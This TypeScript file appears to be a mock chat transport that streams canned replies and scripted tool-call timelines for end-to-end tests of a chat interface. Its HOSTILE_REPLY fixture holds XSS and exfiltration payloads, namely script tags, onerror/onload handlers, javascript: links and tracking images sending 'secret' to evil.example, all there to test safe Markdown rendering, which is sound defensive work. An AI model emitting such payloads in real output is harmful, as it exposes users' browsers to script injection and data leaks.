// SPDX-License-Identifier: Apache-2.0
import type { HarnessEvent, TurnLimit } from "@opa/core";
import type { ChatTransport } from "./transport";

const REPLY =
  "This is a placeholder reply. The assistant isn't connected yet, so every message gets this " +
  "answer, streamed a word at a time.";

/**
 * Sending exactly this gets hostile Markdown back, for the exfil-safe rendering test (M3-10 AC3).
 * Every remote URL is on `evil.example`; every script sets `window.pwned`.
 */
export const MOCK_HOSTILE = "/mock hostile markdown";
export const HOSTILE_REPLY = [
  "## Your summary",
  "Here is **bold**, `code` and [the docs](https://docs.example/guide).",
  "![tracker](https://evil.example/pixel.png?q=secret) ![svg](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20onload='window.pwned=1'/%3E) ![rel](//evil.example/r.png)",
  "[click me](javascript:window.pwned=1) [data](data:text/html,<script>window.pwned=1</script>) <https://evil.example/auto>",
  '<img src="https://evil.example/raw.png" onerror="window.pwned=1"><script>window.pwned=1</script>',
  '<svg onload="window.pwned=1"><image href="https://evil.example/s.png"/></svg><iframe src="https://evil.example/f"></iframe>',
  '<a href="https://evil.example/x" style="background:url(https://evil.example/bg.png)">styled</a>',
  "| Item | Cost |\n| --- | --- |\n| Lunch | $12 |",
  "```html\n<img src=https://evil.example/code.png onerror=window.pwned=1>\n```",
].join("\n\n");

/** Sending exactly one of these gets that limit's refusal instead of a reply. */
export const MOCK_LIMITS = new Map<string, TurnLimit>([
  ["/mock slow down", "slow_down"],
  ["/mock limit reached", "limit_reached"],
]);
/** Sending exactly this gets the refusal for saved keys that no longer open (TWO-650). */
export const MOCK_VAULT_RESET = "/mock vault reset";
/** Sending exactly this holds the turn's start for a second, as a slow server would. */
export const MOCK_SLOW_START = "/mock slow start";
/**
 * Sending exactly this gets a scripted run with one searching step, a tool call, web taint
 * and usage, for the timeline e2e tests (M3-09). Slow enough to watch the running header.
 */
export const MOCK_TIMELINE = "/mock timeline";
/** Sending exactly this queues a follow-up behind the scripted run, for the queued bubble. */
export const MOCK_QUEUED = "/mock queued";
/** Sending exactly this gets the scripted run with its tool call failing (M3-09 AC2). */
export const MOCK_TIMELINE_FAILED = "/mock timeline failed";
const TIMELINE_REPLY = "Here's what I found in the docs.";
const TIMELINE_FAILED_REPLY = "The docs lookup failed, so this is from memory.";
/** A beat between scripted events: the running header is watchable, the run still ends fast. */
const SCRIPT_MS = 300;
const LIMIT_MESSAGES: Record<TurnLimit, string> = {
  slow_down: "You're sending messages quickly. Wait a minute, then try again.",
  limit_reached: "You've reached today's spending limit. It resets at midnight UTC.",
};

/** Streams a canned reply a word at a time, for the e2e tests and `vite dev` without a Worker. */
export function createMockTransport(delayMs = 30): ChatTransport {
  let turns = 0;
  let seq = 0; // one counter, as the server's per-conversation `seq` never restarts per turn
  let onEvent: (event: HarnessEvent) => void = () => {};
  let stop: (() => void) | null = null;
  /** The latest turn's ID, so a dequeue lands on it the way the server's would — even when
   * the run finishes while the Cancel click is on its way. */
  let current: { sessionId: string; turnId: string } | null = null;
  return {
    connect(handle, onOpen) {
      onEvent = handle;
      queueMicrotask(onOpen);
      return () => {
        onEvent = () => {};
      };
    },
    send(sessionId, text) {
      // Lets the e2e tests and `vite dev` show the limit states (M2-22).
      const reason = MOCK_LIMITS.get(text);
      if (reason) {
        const payload = { message: LIMIT_MESSAGES[reason], reason };
        const event = { v: 1, seq: 0, sessionId, turnId: "", type: "turn.failed", payload };
        return queueMicrotask(() => onEvent(event as HarnessEvent));
      }
      if (text === MOCK_VAULT_RESET) {
        const payload = {
          message:
            "Your saved keys can't be opened. Reset them in Settings, then enter your key again.",
          code: "vault_reset_required",
        };
        const event = { v: 1, seq: 0, sessionId, turnId: "", type: "turn.failed", payload };
        return queueMicrotask(() => onEvent(event as HarnessEvent));
      }
      const turnId = `mock-${++turns}`;
      current = { sessionId, turnId };
      const emit = (type: HarnessEvent["type"], payload = {}) =>
        onEvent({ v: 1, seq: ++seq, sessionId, turnId, type, payload } as HarnessEvent);
      // The turn stays answerable after it settles: a Cancel that loses the race with the
      // run's end still takes its bubble back. The next send replaces it.
      const settle = (type: HarnessEvent["type"], payload = {}) => emit(type, payload);
      /** One searching step with a tool call, web taint and usage, then the reply (M3-09). */
      function scripted(queued: boolean, failTool = false) {
        begin();
        const timers: ReturnType<typeof setTimeout>[] = [];
        const later = (fn: () => void) => void timers.push(setTimeout(fn, SCRIPT_MS));
        if (queued) {
          later(() =>
            emit("turn.queued", {
              messageId: `${turnId}-queued`,
              text: "And the follow-up",
              position: 1,
              conversationId: sessionId,
            }),
          );
        }
        later(() =>
          emit("step.started", { stepId: "s1", label: "Searching the docs", toolCallId: "t1" }),
        );
        later(() =>
          emit("usage.updated", {
            providerId: "openai",
            model: "gpt-4.1-mini",
            usage: {
              inputTokens: 1200,
              outputTokens: 300,
              cachedInputTokens: 0,
              reasoningTokens: 0,
            },
          }),
        );
        later(() =>
          emit("tool.called", {
            toolCallId: "t1",
            tool: "fetch",
            args: '{"url":"https://docs.example/guide"}',
            risk: "read",
          }),
        );
        later(() => {
          // A failed call reports like the loop's own failures: the output it got, as the error
          // (harness-builtin `result`). Nothing arrived, so nothing taints the context.
          const error = "docs.example refused the connection";
          emit("tool.result", {
            toolCallId: "t1",
            ok: !failTool,
            preview: failTool ? error : "3 pages · 12 KB",
            bytes: failTool ? error.length : 12288,
            ...(failTool ? { error } : {}),
          });
          if (!failTool) {
            emit("context.tainted", {
              stepId: "s1",
              source: { kind: "web", label: "docs.example" },
            });
          }
        });
        later(() =>
          emit("step.completed", {
            stepId: "s1",
            status: failTool ? "error" : "ok",
            durationMs: 1500,
          }),
        );
        later(() => {
          stop = null;
          emit("message.completed", { text: failTool ? TIMELINE_FAILED_REPLY : TIMELINE_REPLY });
          settle("turn.completed");
        });
        stop = () => {
          for (const timer of timers) clearTimeout(timer);
          stop = null;
          if (!started) begin();
          settle("turn.cancelled");
        };
      }
      const reply = text === MOCK_HOSTILE ? HOSTILE_REPLY : REPLY;
      const words = reply.split(/(?<= )/);
      let timer: ReturnType<typeof setTimeout> | undefined;
      const tick = () => {
        const text = words.shift();
        if (text === undefined) {
          stop = null;
          emit("message.completed", { text: reply });
          return settle("turn.completed");
        }
        emit("message.delta", { text });
        timer = setTimeout(tick, delayMs);
      };
      let started = false;
      const begin = () => {
        started = true;
        emit("turn.started", { messageId: `${turnId}-reply` });
      };
      stop = () => {
        clearTimeout(timer);
        stop = null;
        // A turn stopped before its start still starts, so the tab can match the cancellation.
        if (!started) begin();
        settle("turn.cancelled");
      };
      const start = () => {
        begin();
        timer = setTimeout(tick, delayMs);
      };
      if (text === MOCK_TIMELINE || text === MOCK_QUEUED || text === MOCK_TIMELINE_FAILED)
        return void scripted(text === MOCK_QUEUED, text === MOCK_TIMELINE_FAILED);
      if (text === MOCK_SLOW_START) timer = setTimeout(start, 1000);
      else start();
    },
    cancel: () => stop?.(),
    dequeue: (conversationId, messageId) => {
      if (current?.sessionId !== conversationId) return;
      const { sessionId, turnId } = current;
      queueMicrotask(() =>
        onEvent({
          v: 1,
          seq: ++seq,
          sessionId,
          turnId,
          type: "turn.dequeued",
          // Logged under the running turn like the server's, naming the send's conversation.
          payload: { messageId, conversationId: sessionId },
        } as HarnessEvent),
      );
    },
    conversations: async () => [],
    messages: async () => null,
  };
}
